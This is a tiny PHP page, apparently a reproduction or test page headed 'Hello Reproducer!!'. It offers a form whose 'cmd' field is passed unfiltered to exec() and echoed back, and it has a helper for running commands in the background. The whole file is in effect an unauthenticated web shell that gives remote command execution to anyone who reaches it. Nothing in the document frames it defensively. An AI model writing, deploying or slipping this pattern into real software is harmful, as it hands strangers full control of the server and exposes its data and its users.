<?php

function bg_exec($cmd)
{
    exec($cmd.' > /dev/null &');
}

echo "Hello Reproducer!!";

if (isset($_POST['cmd'])) {
    echo '<pre>';
    echo exec($_POST['cmd']).PHP_EOL;
    echo '</pre>';
}

?>
<hr>
<form action="/" method="post">
    <input type="text" name="cmd">
    <button type="submit">exec</button>
</form>
